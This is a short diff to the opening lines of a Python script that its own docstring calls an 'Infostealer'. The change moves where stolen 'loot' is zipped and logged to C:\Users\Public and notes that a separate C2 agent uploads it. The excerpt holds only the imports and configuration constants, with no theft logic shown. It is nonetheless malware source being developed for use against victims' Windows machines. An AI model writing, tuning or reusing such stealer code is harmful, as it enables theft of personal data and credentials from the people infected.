@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
 r"""
-Infostealer – saves loot to C:\Users\Public\Chrome\stealer_loot.zip
+Infostealer – saves loot to C:\Users\Public\stealer_loot.zip
 No network activity – the C2 agent will upload it.
+C:\Users\Public always exists on every Windows machine.
 """
 
 import os, sys, json, re, shutil, subprocess, zipfile, tempfile, logging, datetime, pathlib, configparser, sqlite3, ctypes
 import winreg, time
 
 # ============ CONFIG ============
-LOOT_DIR = pathlib.Path(r"C:\Users\Public\Chrome")
+LOOT_DIR = pathlib.Path(r"C:\Users\Public")
 LOOT_ZIP = LOOT_DIR / "stealer_loot.zip"
 LOG_FILE = LOOT_DIR / "stealer.log"
 
